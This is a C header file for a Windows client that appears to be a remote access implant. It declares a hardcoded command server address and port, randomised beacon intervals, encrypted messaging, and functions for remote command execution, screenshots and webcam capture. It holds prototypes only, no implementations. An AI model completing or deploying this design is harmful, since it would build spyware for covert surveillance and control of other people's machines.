#ifndef CLIENT_H
#define CLIENT_H

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <tchar.h>
#include <time.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincodec.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/buffer.h>
#include <openssl/err.h>

// #pragma comment(lib, "ws2_32.lib")
// #pragma comment(lib, "libssl.lib")
// #pragma comment(lib, "libcrypto.lib")
// #pragma comment(lib, "ole32.lib")
// #pragma comment(lib, "oleaut32.lib")
// #pragma comment(lib, "gdi32.lib")
// #pragma comment(lib, "windowscodecs.lib")

#define KEY_LENGTH 32
#define IV_LENGTH 12
#define SALT_LENGTH 32
#define TAG_LENGTH 16
#define SESSION_ID_LENGTH 32
#define SHA256_DIGEST_LENGTH 32
#define CHUNK_SIZE 1024

// Globals
SOCKET client_socket = INVALID_SOCKET;
time_t start_time;
FILE* log_file = NULL;
int exit_process = FALSE;
char SESSION_ID[SESSION_ID_LENGTH + 1] = {0};
char IP_ADDRESS[INET6_ADDRSTRLEN] = {0};
const boolean LOGGING = TRUE;
const char* CVER = "0.2.0";
const char* TYPE = "c";
const char* SERVER_ADDRESS = "10.0.0.129";
const int SERVER_PORT = 54678;
const int MAX_RETRIES = 5;
const int RETRY_INTERVALS[] = {
    10000,   // 10 seconds
    30000,   // 30 seconds
    60000,   // 1 minute
    120000,  // 2 minutes
    240000,  // 4 minutes
    360000   // 6 minutes
};
static const int BEACON_MIN_INTERVAL = 300000; // 5 minutes
static const int BEACON_MAX_INTERVAL = 2700000; // 45 minutes

const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
int base64_invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
	59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
	6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
	21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
	29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
	43, 44, 45, 46, 47, 48, 49, 50, 51 };

// Function prototypes
void log_it(const char* format, ...);
void get_session_id(char* ip_address);
size_t b64_encoded_size(size_t inlen);
size_t b64_decoded_size(const char *in);
int b64_isvalidchar(char c);
char* base64_encode(const unsigned char *data, size_t length);
int base64_decode(const char *in, unsigned char *out, size_t outlen);
char* encrypt_data(const char *data, const char *shared_key);
char* decrypt_data(const char *encrypted, const char *shared_key);
void send_command(const char* response);
void send_beacon();
void sleep_ms(int milliseconds);
int get_retry_interval(int retries);
WCHAR* utf8_to_utf16(const char* str);
DWORD WINAPI beacon_interval_thread(LPVOID lpParam);
HANDLE start_beacon_interval(void);
void run_screenshot(void);
void run_webcam_clip(void);
void parse_action(const char* action);
char* format_file_name(const char* name, const char* extension);
char* format_time(long milliseconds);
void get_uptime(void);
char* run_command(const char* command);
void handle_connection(void);
char* get_peer_info(SOCKET sock);
int connect_to_server(void);

#endif // CLIENT_H